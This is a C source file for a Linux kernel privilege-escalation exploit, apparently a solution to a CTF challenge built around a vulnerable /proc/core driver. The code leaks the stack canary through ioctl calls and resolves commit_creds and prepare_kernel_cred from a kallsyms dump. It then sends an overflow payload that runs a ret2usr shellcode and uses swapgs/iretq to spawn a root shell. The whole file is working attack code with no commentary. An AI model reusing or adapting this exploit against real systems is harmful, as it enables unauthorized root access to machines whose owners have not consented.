/*
swapgs iretq
http://repwn.com/archives/16/
*/

#include <stdio.h>  
#include <fcntl.h>  
#include <sys/types.h>  
#include <unistd.h>  
#include <sys/ioctl.h> 
#include <stdint.h>
#include <sys/mman.h>

#define IOCTL_CORE_READ 0x6677889B /*core_read*/  
#define IOCTL_CORE_PRINT  0x6677889C /*set off*/  
#define IOCTL_CORE_COPY  0x6677889A /*core_copy_func*/  

/*
typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
*/

void* (*prepare_kernel_cred)(void*) = (void*) 0x0;
void (*commit_creds)(void*) = (void*) 0x0;

unsigned long canary;

unsigned long user_cs, user_ss, user_rflags, base;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void get_shell()
{
    system("/bin/sh");
}

static void shellcode()
{
    commit_creds(prepare_kernel_cred(0));
    asm(
        "swapgs\n"
        "movq %0,%%rax\n"    // push things into stack for iretq
        "pushq %%rax\n"
        "movq %1,%%rax\n"
        "pushq %%rax\n"
        "movq %2,%%rax\n"
        "pushq %%rax\n"
        "movq %3,%%rax\n"
        "pushq %%rax\n"
        "movq %4,%%rax\n"
        "pushq %%rax\n"
        "iretq\n"
        :
        :"r"(user_ss),"r"(base + 0x10000),"r"(user_rflags),"r"(user_cs),"r"(get_shell)
        :"memory"
    );
}

unsigned long find_symbol_by_proc(char *file_name, char *symbol_name)
{
    FILE *s_fp;
    char buff[200] = {0};
    char *p = NULL;
    char *p1 = NULL;
    unsigned long addr = 0;
    s_fp = fopen(file_name, "r");
    if (s_fp == NULL){
        printf("open %s failed.\n", file_name);
        return 0;
    }

    while (fgets(buff, 200, s_fp) != NULL){

        if (strstr(buff, symbol_name) != NULL){
            buff[strlen(buff) - 1] = '\0';
            p = strchr(strchr(buff, ' ') + 1, ' ');
            ++p;

            if (!p) {
                return 0;
            }

            if (!strcmp(p, symbol_name)){
                p1 = strchr(buff, ' ');
                *p1 = '\0';
                sscanf(buff, "%lx", &addr);
                //addr = strtoul(buff, NULL, 16);
                printf("[+] found %s addr at 0x%x.\n",symbol_name, addr);
                break;
            }
        
        }
    }
    
    fclose(s_fp);
    return addr;
    
}

int main()
{
  
    if ((base = mmap(0, 0x40000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL) {
        perror("mmap");
        exit(1);
    }

    int fd;
    char tmp[65];
    fd = open("/proc/core",O_RDWR);
    //leak
    ioctl(fd, IOCTL_CORE_PRINT, 64);
    ioctl(fd, IOCTL_CORE_READ, &tmp);
    memcpy(&canary, tmp, 8);
    save_state();

    prepare_kernel_cred= (void*) find_symbol_by_proc("/tmp/kallsyms","prepare_kernel_cred");
    commit_creds= (void*) find_symbol_by_proc("/tmp/kallsyms","commit_creds");

    unsigned long payload[] = {
        0,0,0,0,0,0,0,0,
        canary,
        base + 0x20000,
        shellcode
    };

    write(fd, payload, 160);
    //get root
    ioctl(fd, IOCTL_CORE_COPY, 0xffffffffffff00a8);
    return 0;
}
